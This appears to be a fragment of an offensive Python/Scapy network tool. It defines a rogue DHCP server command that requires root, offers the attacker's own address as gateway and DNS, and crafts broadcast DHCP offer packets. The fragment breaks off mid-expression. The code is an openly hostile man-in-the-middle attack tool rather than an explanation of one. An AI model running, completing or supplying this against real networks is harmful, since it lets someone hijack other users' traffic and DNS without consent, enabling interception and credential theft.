def roguedhcp_cmd(args):
    need_root()
    iface = args.iface
    gw = args.offer_gw or my_ip(iface)
    dns = args.offer_dns or gw
    base, start = args.pool.rsplit(".", 1)
    start = int(start.split("/")[0])
    macs = {}

    print(f"[*] rogue DHCP on {iface}: pool {base}.{start}+ gw={gw} dns={dns}")

    def build(mt, req, yiaddr):
        return (Ether(dst="ff:ff:ff:ff:ff:ff", src=my_mac(iface)) /
                IP(src=gw, dst="255.255.255.255") /
                UDP(sport=67, dport=68) /
                BOOTP(op=2, yiaddr=yiaddr, siaddr=gw,
                      chaddr=req[BOOTP].chaddr, xid=req[BOOTP].xid) /
